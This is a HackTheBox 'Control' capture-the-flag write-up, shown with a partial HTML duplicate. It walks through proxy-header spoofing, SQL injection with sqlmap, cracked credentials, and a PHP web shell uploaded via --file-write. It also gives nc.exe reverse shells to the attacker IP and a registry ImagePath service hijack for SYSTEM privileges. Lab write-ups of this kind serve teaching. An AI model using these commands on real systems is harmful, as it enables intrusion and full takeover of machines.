Control is a Hard difficulty Windows box (yay!) that was just retired from HackTheBox. Control was a very good challenge, it starts out in a pretty generic manner, requiring the exploitation of a SQL injection flaw in a web application that only allows users connecting from a specific proxy, but when local access is established the real fun begins.

And by fun I mean trial and error, because there is quite a bit of guess work going on in the privilege escalation part, but even if the box doesn&#39;t tell you what to do in a huge font it still leaves out some hints so that you can get there in the end, when you realize that in order to escalate privileges you have to find a Windows service of which you can change the properties from the registry to hijack its execution when it is then started, which I thought was a pretty cool idea.

## Enumeration

A full nmap scan doesn&#39;t reveal a big attack surface, with just HTTP MS-RPC and MySQL available:

The IIS web server has a neat little application running that looks like this:

![immagine|446x500](upload://puHsBKqvZastaiRJTR40iicZdDd.jpeg) 

The only apparently interesting feature here is the Admin button, upon clicking it we are given an error stating we must go through a proxy in order to access the page, and that this proxy is supposed to add a special header to our HTTP requests:

![immagine|690x70](upload://64nD7oVuiGxZdU4GQo4OjYHoqc7.png) 

Here are a few headers commonly added by HTTP proxies when a client goes through one:

```http
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
```

With a 127.0.0.1 address in, these headers actually become possible bypasses. A proxy will replace the 127.0.0.1 address with that of the client making the request to the application, which will check if the supplied IP is authorized to access the desired page.

Using 127.0.0.1 as the value of all these headers is a typical bypass based on the assumption that the server trusts requests coming from itself, thus thinking the requests come from a host that is authorized to access the application of interest.

Unfortunately for us, adding these headers manually with Burp and making a request to the Admin page returns the same exact error as before, meaning we are missing something. Perhaps localhost is not in the app&#39;s access control whitelist. We&#39;ll be back here soon.

Running Dirbuster allows to find a bunch of files and folders that are not apparent from the main site accessible to unauthenticated users, mainly the uploads folder and a bunch of PHP pages that have to do with product management of some sort (don&#39;t mind the n2s.php page, it&#39;s a web shell dropped by some other user):

![immagine|546x499](upload://gWd5m27EFPYhJ7Vuxv8662TjHgc.png) 

Other PHP pages are referenced by the /assets/js/functions.js script:

```js
function deleteProduct(id) {
	document.getElementById(&quot;productId&quot;).value = id;
	document.forms[&quot;viewProducts&quot;].action = &quot;delete_product.php&quot;;
	document.forms[&quot;viewProducts&quot;].submit();
}
function updateProduct(id) {
	document.getElementById(&quot;productId&quot;).value = id;
	document.forms[&quot;viewProducts&quot;].action = &quot;update_product.php&quot;;
	document.forms[&quot;viewProducts&quot;].submit();
}
function viewProduct(id) {
	document.getElementById(&quot;productId&quot;).value = id;
	document.forms[&quot;viewProducts&quot;].action = &quot;view_product.php&quot;;
	document.forms[&quot;viewProducts&quot;].submit();
}
function deleteCategory(id) {
	document.getElementById(&quot;categoryId&quot;).value = id;
	document.forms[&quot;categoryOptions&quot;].action = &quot;delete_category.php&quot;;
	document.forms[&quot;categoryOptions&quot;].submit();
}
function updateCategory(id) {
	document.getElementById(&quot;categoryId&quot;).value = id;
	document.forms[&quot;categoryOptions&quot;].action = &quot;update_category.php&quot;;
	document.forms[&quot;categoryOptions&quot;].submit();
}
```

Plus, /assets/js/checkvalues.js implements some client-side checks for the validity of user supplied input, a probable indicator of custom code running in the web application&#39;s Admin area where those product-related PHP pages can be accessed:

```js
function checkValues(form) {
   if (form == &quot;updateProduct&quot;) {
      var name = document.forms[&quot;updateProduct&quot;][&quot;name&quot;].value;
      var quantity = document.forms[&quot;updateProduct&quot;][&quot;quantity&quot;].value;
      var price = document.forms[&quot;updateProduct&quot;][&quot;price&quot;].value;
      if (name.length &lt;= 0) {
         alert(&quot;Name cannot be empty!&quot;);
         return false;
      }
      if (quantity &lt; 0 || quantity == &quot;&quot;) {
         alert(&quot;Quantity cannot be less than 0!&quot;);
         return false;
      }
      if (price == 0 || price.includes(&quot;-&quot;)) {
         alert(&quot;Price must be greater than 0&quot;);
         return false;
      }
   } else if (form == &quot;createProduct&quot;) {
      var name = document.forms[&quot;createProduct&quot;][&quot;name&quot;].value;
      var quantity = document.forms[&quot;createProduct&quot;][&quot;quantity&quot;].value;
      var price = document.forms[&quot;createProduct&quot;][&quot;price&quot;].value;
      if (name.length &lt;= 0) {
         alert(&quot;Name cannot be empty!&quot;);
         return false;
      }
      if (quantity &lt; 0 || quantity == &quot;&quot;) {
         alert(&quot;Quantity cannot be less than 0!&quot;);
         return false;
      }
      if (price == 0 || price.includes(&quot;-&quot;)) {
         alert(&quot;Price must be greater than 0&quot;);
         return false;
      }
   } else if (form == &quot;createCategory&quot;) {
      var name = document.forms[&quot;createCategory&quot;][&quot;name&quot;].value;
      if (name.length &lt;= 0) {
         alert(&quot;Name cannot be empty!&quot;);
         return false;
      }
   } else if (form == &quot;updateCategory&quot;) {
      var name = document.forms[&quot;updateCategory&quot;][&quot;name&quot;].value;
      if (name.length &lt;= 0) {
         alert(&quot;Name cannot be empty!&quot;);
         return false;
      }
   }
   return true;
}
```

I tried fuzzing these pages and their parameters blindly with wfuzz but didn&#39;t have any success in receiving interesting output from them.

Going back to the index of the web application a comment is found in the source code:

```
&lt;body class=&quot;is-preload landing&quot;&gt;
	&lt;div id=&quot;page-wrapper&quot;&gt;
		&lt;!-- To Do:
			- Import Products
			- Link to new payment system
			- Enable SSL (Certificates location \\192.168.4.28\myfiles)
		&lt;!-- Header --&gt;
```

We can deduce from this comment that the web server is supposed to trust an external server hosting SSL certificates, with the IP address of this server we can try injecting the custom proxy headers again using the IP above instead of 127.0.0.1:

```http
X-Originating-IP: 192.168.4.28
X-Forwarded-For: 192.168.4.28
X-Remote-IP: 192.168.4.28
X-Remote-Addr: 192.168.4.28
```

It can be very uncomfortable running every request through Burp to add the headers every time since as soon as we click another link on the application a request without the header will be generated, causing us to see the error again.

To solve this issue I used the [CustomHeaders](https://github.com/mirfansulaiman/CustomHeader) Burp extension to add the headers automatically to every request caught by the Burp proxy:

![immagine|690x186](upload://3lY9T4tfBnjM1CjcvqFdK2kM2L.png) 

Adding all four headers with the correct IP address loads the admin page this time:

![immagine|331x500](upload://lHTDCZsmWfy9TCQxtcpQ8ojt864.png) 

Going by exclusion it turns out the correct proxy header the web application checks for is this one:

```http
X-Forwarded-For: 192.168.4.28
```

Anyway now that we can finally see and use the Admin page we can observe how those PHP pages from earlier are utilized. New products can be created:

![immagine|690x272](upload://zZ74i2PYGgfoLpALYjyLIqAJYL9.png) 

As well as new categories:

![immagine|690x370](upload://3jJoTPSHYRc36WXNNwJBEZ47Kqo.png) 

After playing around with those functions I didn&#39;t find them to be attackable, however SQL errors can be triggered by adding a single quote in the search field at the top of the page, so the search_products.php page appears to be vulnerable to SQL injection:

![immagine|690x211](upload://1n6A1YzcmpzDxXR0uGdfft8Mtfu.png)

## Exploitation: SQL Injection (DB dump, file upload)

We can use sqlmap to exploit the flaw and dump the passwords in the databases, making sure to add the proxy header to the requests for good measure:

The program was able to pull three different hashes as well as the usernames they belong to, two of those hashes are easily matched with cleartext passwords by [CrackStation](https://crackstation.net/) so we don&#39;t even have to bruteforce anything:

![immagine|690x262](upload://oKrCvGOelLYCIQgpGa3xjBYUzHK.png) 

This gives us two sets of possible credentials:

```text
User: hector
Pass: l33th4x0rhector

User: manager
Pass: l3tm3!n
```

The first thing I tried doing with the credentials is connecting to the MySQL server using the mysql client, however we are not authorized to access the server:

```text
baud@kali:~/HTB/control$ mysql -h 10.10.10.167 -u manager -p
Enter password: 
ERROR 1130 (HY000): Host &#39;10.10.15.203&#39; is not allowed to connect to this MariaDB server
```

So back to sqlmap, another possible way in is using the SQL injection vulnerability to upload arbitrary files on the server, like a simple PHP shell to execute shell commands. Here we&#39;re going to have to guess the name of a directory we can write to, I went for the uploads folder found earlier and assumed it is located in the default IIS directory, C:\inetpub\wwwroot. Luckily the assumption was correct and the file was written on the server:

```text
baud@kali:~/HTB/control$ sqlmap -u http://10.10.10.167/search_products.php --data=&#39;productName=name&#39; --headers=&#39;X-Forwarded-For: 192.168.4.28&#39; --file-write=./baud.php --file-dest=&#39;C:\\inetpub\\wwwroot\\uploads\\baud3.php&#39;

The shell is very simple and only has the purpose of giving me the ability to launch a different shell since I wasn&#39;t able to execute OS commands from sqlmap itself using --os-cmd or --os-shell:

```
&lt;html&gt;
&lt;body&gt;
	&lt;pre&gt;
	&lt;?php
		system($_GET[&#39;cmd&#39;]);
	?&gt;
	&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;
```

The shell I want to launch makes use of [nc for Windows](https://eternallybored.org/misc/netcat/) so I uploaded the binary in the same folder as well:

Check if the web shell works as intended:

Now with a single request to that page we can start a proper reverse shell using nc and we&#39;re in:

## Escalating to Hector and local enumeration

As it turns out the Manager user does not exist, but Hector does have an account on the system:

```text
C:\inetpub\wwwroot\uploads&gt;dir c:\users
dir c:\users
 Volume in drive C has no label.
 Volume Serial Number is C05D-877F

 Directory of c:\users

11/05/2019  03:34 PM    &lt;DIR&gt;          .
11/05/2019  03:34 PM    &lt;DIR&gt;          ..
11/05/2019  03:34 PM    &lt;DIR&gt;          Administrator
11/01/2019  12:09 PM    &lt;DIR&gt;          Hector
10/21/2019  05:29 PM    &lt;DIR&gt;          Public
               0 File(s)              0 bytes
               5 Dir(s)  43,519,860,736 bytes free

C:\inetpub\wwwroot\uploads&gt;
```

Because we already have found Hector&#39;s password we can switch to it with a [PSSession](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_pssessions?view=powershell-7):

```text
C:\inetpub\wwwroot\uploads&gt;powershell

PS C:\inetpub\wwwroot\uploads&gt; $pw = ConvertTo-SecureString -String &quot;l33th4x0rhector&quot; -AsPlainText -force
$pw = ConvertTo-SecureString -String &quot;l33th4x0rhector&quot; -AsPlainText -force
PS C:\inetpub\wwwroot\uploads&gt; $pp = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList &quot;.\Hector&quot;, $pw

```

And then launch nc.exe again to have a more comfortable shell instead of the awkward [Invoke-Command](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7) syntax:

```text
[localhost]: PS C:\Users\Hector\Documents&gt; Invoke-Command -ScriptBlock { C:\inetpub\wwwroot\uploads\nc.exe -e cmd.exe 10.10.15.203 9898 }
```

Looking for interesting files, the only thing that sticks out is Hector&#39;s&#39; PowerShell history located in AppData:

```text
C:\Users\Hector\AppData&gt;dir C:\Users\Hector\AppData\roaming\microsoft\windows\powershell\psreadline
dir C:\Users\Hector\AppData\roaming\microsoft\windows\powershell\psreadline

               2 Dir(s)  43,519,021,056 bytes free

C:\Users\Hector\AppData&gt;
```

It contains the following commands:

```text
C:\Users\Hector\AppData&gt;more C:\Users\Hector\AppData\roaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txt
more C:\Users\Hector\AppData\roaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txt
get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
get-acl HKLM:\SYSTEM\CurrentControlSet | format-list

C:\Users\Hector\AppData&gt;
```

There are two commands that query the registry, replicating the first one returns this output:

This is just used to return all the child items of the CurrentControlSet registry location. The second command on the other hand shows the access control list of the same registry entry:

```

While that output does not contain very interesting info it comes from a command we can re-use for further enumeration in the next phase, which is where the guess work bit begins.

---

## Beginning of the guess work

The box gave us a few hints, now it&#39;s up to us to put all of them together and come up with an attack vector. Judging from his PowerShell history Hector was concerned with checking the ACL of the CurrentControlSet registry entries, so maybe, just maybe, some entries in there will have some interesting or non-standard permissions that we could take advantage of. This is our first assumption.

Arguably the most interesting entry within the CurrentControlSet child items is Services. All entries in the Services folder tell Windows how to manage the installed services, how to start them, when, with what privileges, and so on.

As we should already know, Windows services typically run under the [local SYSTEM](https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account) account unless they&#39;ve been set to use a less privileged account, like the [local service](https://docs.microsoft.com/en-us/windows/win32/services/localservice-account) or the [network service](https://docs.microsoft.com/en-us/windows/win32/services/networkservice-account) accounts.

Because of the very high privileges under which a lot of services run they make for very interesting targets. So let&#39;s start enumerating the services this installation of Windows has enabled, simply by listing the child entries of the Services directory in the registry:

```text
PS C:\Users\Hector\Documents&gt; reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services &gt; svcs.txt
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services &gt; svcs.txt
PS C:\Users\Hector\Documents&gt; dir
dir


    Directory: C:\Users\Hector\Documents


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----         4/6/2020   6:58 PM          45272 nc.exe

-a----         4/6/2020   7:02 PM              0 Servicenames.txt                                                      
-a----         4/6/2020   7:03 PM          85894 svcs.txt                                                              


PS C:\Users\Hector\Documents&gt;
```

The output will look like this:

```text
[....]
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\netvscvfpp
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\NgcCtnrSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\NgcSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\NlaSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\Npfs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\npsvctrig
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\nsi
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\nsiproxy
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\Ntfs
[....]
```

Transfer the output file locally using nc since we have it available, for easier analysis:

![immagine|690x303](upload://fFlhHkqKr4yzLPQOAb8Z2iU9snI.png) 

With a list of the different service paths in the registry we can use the [Get-ACL](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7) cmdlet that was also used by Hector to test a bunch of services for interesting permissions, I also pipe the output of the cmdlet to *fl*, which is an alias for [Format List](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/format-list?view=powershell-7), to avoid receiving a truncated output.

Of course this can be scripted very easily if you are not new to PowerShell, but because I suck at it I did it the manual way.

After trying out a few different services, you will eventually run into one that grants Hector full control access, like DeviceInstall:

```text
PS C:\Users\Hector\Documents&gt; get-acl HKLM:\SYSTEM\CurrentControlset\Services\DeviceInstall | fl
get-acl HKLM:\SYSTEM\CurrentControlset\Services\DeviceInstall | fl


Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\DeviceInstall
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         NT AUTHORITY\SYSTEM Allow  FullControl
         CREATOR OWNER Allow  FullControl
         NT AUTHORITY\Authenticated Users Allow  ReadKey
         NT AUTHORITY\SYSTEM Allow  FullControl
         CONTROL\Hector Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
Audit  : 
Sddl   : O:SYG:SYD:AI(A;CIID;KR;;;AC)(A;ID;KA;;;SY)(A;CIIOID;KA;;;CO)(A;CIID;KR;;;AU)(A;CIIOID;KA;;;SY)(A;CIID;KA;;;S-1
         -5-21-3271572904-80546332-2170161114-1000)(A;CIID;KA;;;BA)
```

With those permissions DeviceInstall could make for an attackable service. Let&#39;s query the registry for more information to see how a service entry looks like:

```text
PS C:\Users\Hector\Documents&gt; reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\DeviceInstall
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\DeviceInstall

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\DeviceInstall
    Description    REG_SZ    @%SystemRoot%\system32\umpnpmgr.dll,-101
    DisplayName    REG_SZ    @%SystemRoot%\system32\umpnpmgr.dll,-100
    ErrorControl    REG_DWORD    0x1
    FailureActions    REG_BINARY    100E0000000000000000000003000000140000000100000060EA000001000000C0D401000000000000000000
    FailureActionsOnNonCrashFailures    REG_DWORD    0x1
    Group    REG_SZ    PlugPlay
    ImagePath    REG_EXPAND_SZ    %SystemRoot%\system32\svchost.exe -k DcomLaunch -p
    ObjectName    REG_SZ    LocalSystem
    PreshutdownTimeout    REG_DWORD    0x36ee80
    RequiredPrivileges    REG_MULTI_SZ    SeTcbPrivilege\0SeSecurityPrivilege\0SeAssignPrimaryTokenPrivilege\0SeTakeOwnershipPrivilege\0SeLoadDriverPrivilege\0SeBackupPrivilege\0SeRestorePrivilege\0SeImpersonatePrivilege\0SeAuditPrivilege\0SeChangeNotifyPrivilege\0SeUndockPrivilege\0SeDebugPrivilege\0SeShutdownPrivilege
    ServiceSidType    REG_DWORD    0x1
    Start    REG_DWORD    0x3
    Type    REG_DWORD    0x20

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\DeviceInstall\Parameters
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\DeviceInstall\TriggerInfo
PS C:\Users\Hector\Documents&gt;
```

Out of all those keys, the one we are interested in is ImagePath. The ImagePath key tells Windows what command to execute when a service needs to be started. If we could change the ImagePath value of one of these services thanks to the permissions seen above and then start that service we would be able to execute arbitrary code as the local SYSTEM account.

Unfortunately, just because a registry ACL includes full control to Hector, it doesn&#39;t mean we will be able to start that service. Hector is not a member of the Administrators group and so cannot arbitrarily shut down or restart services, we&#39;re going to have to do some more trial and error to find some services we can control and which are also not running and we can start ourselves.

---

## Privilege Escalation: Windows Service Hijack

(improvised term)

The [Get-Service](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-service?view=powershell-7) cmdlet comes to our aid, by using it to query a service we can tell whether that service is running or not:

```text
PS C:\Users\Hector\Documents&gt; get-service NetTcpPortSharing | fl
get-service NetTcpPortSharing | fl


Name                : NetTcpPortSharing
DisplayName         : Net.Tcp Port Sharing Service
Status              : Stopped
DependentServices   : {}
ServicesDependedOn  : {}
CanPauseAndContinue : False
CanShutdown         : False
CanStop             : False
ServiceType         : Win32ShareProcess
```

So services that can be queried with Get-Service and appear not to be running make for potential targets. Once again because Hector has limited permissions over services, only a portion of them can be queried with the cmdlet and this allows us to narrow down the number of targets to enumerate.

With some string manipulation we can turn the output file given to us earlier by the reg query command into a .ps1 script like this:

```text
Get-Service -Name &quot;.NET CLR Data&quot;
Get-Service -Name &quot;.NET CLR Networking&quot;
Get-Service -Name &quot;.NET CLR Networking 4.0.0.0&quot;
Get-Service -Name &quot;.NET Data Provider for Oracle&quot;
Get-Service -Name &quot;.NET Data Provider for SqlServer&quot;
Get-Service -Name &quot;.NET Memory Cache 4.0&quot;
Get-Service -Name &quot;.NETFramework&quot;
Get-Service -Name &quot;1394ohci&quot;
Get-Service -Name &quot;3ware&quot;
Get-Service -Name &quot;ACPI&quot;
Get-Service -Name &quot;AcpiDev&quot;
Get-Service -Name &quot;acpiex&quot;
Get-Service -Name &quot;acpipagr&quot;
Get-Service -Name &quot;AcpiPmi&quot;
Get-Service -Name &quot;acpitime&quot;
Get-Service -Name &quot;ADOVMPPackage&quot;
Get-Service -Name &quot;ADP80XX&quot;
Get-Service -Name &quot;adsi&quot;
Get-Service -Name &quot;ADWS&quot;
Get-Service -Name &quot;AFD&quot;
Get-Service -Name &quot;afunix&quot;
Get-Service -Name &quot;ahcache&quot;
Get-Service -Name &quot;AJRouter&quot;
Get-Service -Name &quot;ALG&quot;
Get-Service -Name &quot;AmdK8&quot;
Get-Service -Name &quot;AmdPPM&quot;
[....]
```

Download, execute, redirect output to a file and the result will be something like the following:

```text

Let&#39;s see if we can start any of these stopped services. Most of them will give an error like this:

```text
PS C:\temp&gt; start-service ktmrm
start-service ktmrm
start-service : Service &#39;KtmRm for Distributed Transaction Coordinator (ktmrm)&#39; cannot be started due to the following 
error: Cannot open ktmrm service on computer &#39;.&#39;.
At line:1 char:1
+ start-service ktmrm
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service],  
   ServiceCommandException
    + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.StartServiceCommand
```

But a few will not act so whiny, for example:

```text
PS C:\temp&gt; start-service pla
start-service pla
PS C:\temp&gt; get-service pla | fl
get-service pla | fl


Name                : pla
DisplayName         : Performance Logs &amp; Alerts
Status              : Running
DependentServices   : 
ServicesDependedOn  : {RPCSS}
CanPauseAndContinue : False
CanShutdown         : True
CanStop             : True
ServiceType         : Win32ShareProcess
```

That means the service is attackable because we can tell Windows to start it after overwriting the original registry value with our payload, which could simply be an nc.exe reverse shell, in that case [*reg add*](https://ss64.com/nt/reg.html) is used to change a service&#39;s ImagePath key like this:

```text
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\netsetupsvc /v ImagePath /D &quot;C:\Users\Hector\Documents\nc.exe -e cmd.exe 10.10.15.203 7777&quot;
```

Run Start-Service after the write operation and the payload will be executed:

This concludes the writeup for Control, I hope it was exhaustive, interesting, and comprehensible all at the same time.

Stay safe.</description>

<p>Control is a Hard difficulty Windows box (yay!) that was just retired from HackTheBox. Control was a very good challenge, it starts out in a pretty generic manner, requiring the exploitation of a SQL injection flaw in a web application that only allows users connecting from a specific proxy, but when local access is established the real fun begins.</p>
<p>And by fun I mean trial and error, because there is quite a bit of guess work going on in the privilege escalation part, but even if the box doesn’t tell you what to do in a huge font it still leaves out some hints so that you can get there in the end, when you realize that in order to escalate privileges you have to find a Windows service of which you can change the properties from the registry to hijack its execution when it is then started, which I thought was a pretty cool idea.</p>

<p>The IIS web server has a neat little application running that looks like this:</p>
<p><span alt="immagine" data-base62-sha1="puHsBKqvZastaiRJTR40iicZdDd" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>The only apparently interesting feature here is the Admin button, upon clicking it we are given an error stating we must go through a proxy in order to access the page, and that this proxy is supposed to add a special header to our HTTP requests:</p>
<p><span alt="immagine" data-base62-sha1="64nD7oVuiGxZdU4GQo4OjYHoqc7" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Here are a few headers commonly added by HTTP proxies when a client goes through one:</p>
<pre><code class="lang-http">X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
</code></pre>
<p>With a 127.0.0.1 address in, these headers actually become possible bypasses. A proxy will replace the 127.0.0.1 address with that of the client making the request to the application, which will check if the supplied IP is authorized to access the desired page.</p>
<p>Using 127.0.0.1 as the value of all these headers is a typical bypass based on the assumption that the server trusts requests coming from itself, thus thinking the requests come from a host that is authorized to access the application of interest.</p>
<p>Unfortunately for us, adding these headers manually with Burp and making a request to the Admin page returns the same exact error as before, meaning we are missing something. Perhaps localhost is not in the app’s access control whitelist. We’ll be back here soon.</p>
<p>Running Dirbuster allows to find a bunch of files and folders that are not apparent from the main site accessible to unauthenticated users, mainly the uploads folder and a bunch of PHP pages that have to do with product management of some sort (don’t mind the n2s.php page, it’s a web shell dropped by some other user):</p>
<p><span alt="immagine" data-base62-sha1="gWd5m27EFPYhJ7Vuxv8662TjHgc" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Other PHP pages are referenced by the /assets/js/functions.js script:</p>
<pre><code class="lang-auto">function deleteProduct(id) {
	document.getElementById("productId").value = id;
	document.forms["viewProducts"].action = "delete_product.php";
	document.forms["viewProducts"].submit();
}
function updateProduct(id) {
	document.getElementById("productId").value = id;
	document.forms["viewProducts"].action = "update_product.php";
	document.forms["viewProducts"].submit();
}
function viewProduct(id) {
	document.getElementById("productId").value = id;
	document.forms["viewProducts"].action = "view_product.php";
	document.forms["viewProducts"].submit();
}
function deleteCategory(id) {
	document.getElementById("categoryId").value = id;
	document.forms["categoryOptions"].action = "delete_category.php";
	document.forms["categoryOptions"].submit();
}
function updateCategory(id) {
	document.getElementById("categoryId").value = id;
	document.forms["categoryOptions"].action = "update_category.php";
	document.forms["categoryOptions"].submit();
}
</code></pre>
<p>Plus, /assets/js/checkvalues.js implements some client-side checks for the validity of user supplied input, a probable indicator of custom code running in the web application’s Admin area where those product-related PHP pages can be accessed:</p>
<pre><code class="lang-auto">function checkValues(form) {
   if (form == "updateProduct") {
      var name = document.forms["updateProduct"]["name"].value;
      var quantity = document.forms["updateProduct"]["quantity"].value;
      var price = document.forms["updateProduct"]["price"].value;
      if (name.length &lt;= 0) {
         alert("Name cannot be empty!");
         return false;
      }
      if (quantity &lt; 0 || quantity == "") {
         alert("Quantity cannot be less than 0!");
         return false;
      }
      if (price == 0 || price.includes("-")) {
         alert("Price must be greater than 0");
         return false;
      }
   } else if (form == "createProduct") {
      var name = document.forms["createProduct"]["name"].value;
      var quantity = document.forms["createProduct"]["quantity"].value;
      var price = document.forms["createProduct"]["price"].value;
      if (name.length &lt;= 0) {
         alert("Name cannot be empty!");
         return false;
      }
      if (quantity &lt; 0 || quantity == "") {
         alert("Quantity cannot be less than 0!");
         return false;
      }
      if (price == 0 || price.includes("-")) {
         alert("Price must be greater than 0");
         return false;
      }
   } else if (form == "createCategory") {
      var name = document.forms["createCategory"]["name"].value;
      if (name.length &lt;= 0) {
         alert("Name cannot be empty!");
         return false;
      }
   } else if (form == "updateCategory") {
      var name = document.forms["updateCategory"]["name"].value;
      if (name.length &lt;= 0) {
         alert("Name cannot be empty!");
         return false;
      }
   }
   return true;
}

<p>I tried fuzzing these pages and their parameters blindly with wfuzz but didn’t have any success in receiving interesting output from them.</p>
<p>Going back to the index of the web application a comment is found in the source code:</p>
<pre><code class="lang-auto">&lt;body class="is-preload landing"&gt;
	&lt;div id="page-wrapper"&gt;
		&lt;!-- To Do:
			- Import Products
			- Link to new payment system
			- Enable SSL (Certificates location \\192.168.4.28\myfiles)
		&lt;!-- Header --&gt;
</code></pre>
<p>We can deduce from this comment that the web server is supposed to trust an external server hosting SSL certificates, with the IP address of this server we can try injecting the custom proxy headers again using the IP above instead of 127.0.0.1:</p>
<pre><code class="lang-http">X-Originating-IP: 192.168.4.28
X-Forwarded-For: 192.168.4.28
X-Remote-IP: 192.168.4.28
X-Remote-Addr: 192.168.4.28
</code></pre>
<p>It can be very uncomfortable running every request through Burp to add the headers every time since as soon as we click another link on the application a request without the header will be generated, causing us to see the error again.</p>
<p>To solve this issue I used the <a href="https://github.com/mirfansulaiman/CustomHeader" rel="nofollow noopener">CustomHeaders</a> Burp extension to add the headers automatically to every request caught by the Burp proxy:</p>
<p><span alt="immagine" data-base62-sha1="3lY9T4tfBnjM1CjcvqFdK2kM2L" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Adding all four headers with the correct IP address loads the admin page this time:</p>
<p><span alt="immagine" data-base62-sha1="lHTDCZsmWfy9TCQxtcpQ8ojt864" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Going by exclusion it turns out the correct proxy header the web application checks for is this one:</p>
<pre><code class="lang-http">X-Forwarded-For: 192.168.4.28
</code></pre>
<p>Anyway now that we can finally see and use the Admin page we can observe how those PHP pages from earlier are utilized. New products can be created:</p>
<p><span alt="immagine" data-base62-sha1="zZ74i2PYGgfoLpALYjyLIqAJYL9" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>As well as new categories:</p>
<p><span alt="immagine" data-base62-sha1="3jJoTPSHYRc36WXNNwJBEZ47Kqo" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>After playing around with those functions I didn’t find them to be attackable, however SQL errors can be triggered by adding a single quote in the search field at the top of the page, so the search_products.php page appears to be vulnerable to SQL injection:</p>
<p><span alt="immagine" data-base62-sha1="1n6A1YzcmpzDxXR0uGdfft8Mtfu" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<hr>
<h2>Exploitation: SQL Injection (DB dump, file upload)</h2>
<p>We can use sqlmap to exploit the flaw and dump the passwords in the databases, making sure to add the proxy header to the requests for good measure:</p>

<p>The program was able to pull three different hashes as well as the usernames they belong to, two of those hashes are easily matched with cleartext passwords by <a href="https://crackstation.net/" rel="nofollow noopener">CrackStation</a> so we don’t even have to bruteforce anything:</p>
<p><span alt="immagine" data-base62-sha1="oKrCvGOelLYCIQgpGa3xjBYUzHK" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>This gives us two sets of possible credentials:</p>
<pre><code class="lang-nohighlight">User: hector
Pass: l33th4x0rhector

User: manager
Pass: l3tm3!n
</code></pre>
<p>The first thing I tried doing with the credentials is connecting to the MySQL server using the mysql client, however we are not authorized to access the server:</p>
<pre><code class="lang-nohighlight">baud@kali:~/HTB/control$ mysql -h 10.10.10.167 -u manager -p
Enter password: 
ERROR 1130 (HY000): Host '10.10.15.203' is not allowed to connect to this MariaDB server
</code></pre>
<p>So back to sqlmap, another possible way in is using the SQL injection vulnerability to upload arbitrary files on the server, like a simple PHP shell to execute shell commands. Here we’re going to have to guess the name of a directory we can write to, I went for the uploads folder found earlier and assumed it is located in the default IIS directory, C:\inetpub\wwwroot. Luckily the assumption was correct and the file was written on the server:</p>
